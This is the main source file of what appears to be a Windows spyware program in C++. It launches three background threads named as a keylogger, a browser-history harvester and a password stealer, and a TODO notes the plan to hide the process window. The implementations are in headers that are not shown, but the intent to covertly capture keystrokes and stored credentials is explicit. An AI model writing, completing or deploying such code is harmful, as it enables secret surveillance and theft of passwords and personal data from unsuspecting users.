#include <Windows.h>
#include <chrono>
#include <ctime>
#include <thread>

#include "write.h"
#include "chrome.h"
#include "klog.h"
// #include "capt.h"

int main(){
    //TODO make hide the process window

    //Awaken the daemons
    std::thread klogd(init_klogd);
    std::thread historyd(init_historyd);
    std::thread passwordd(init_passwordd);

    //This is just a theortical end to make sure that the main process doesn't end, thus killing the daemons.
    //klogd.join() theortically will never be reached
    passwordd.join();
    historyd.join();
    klogd.join();
    

    return 0;
}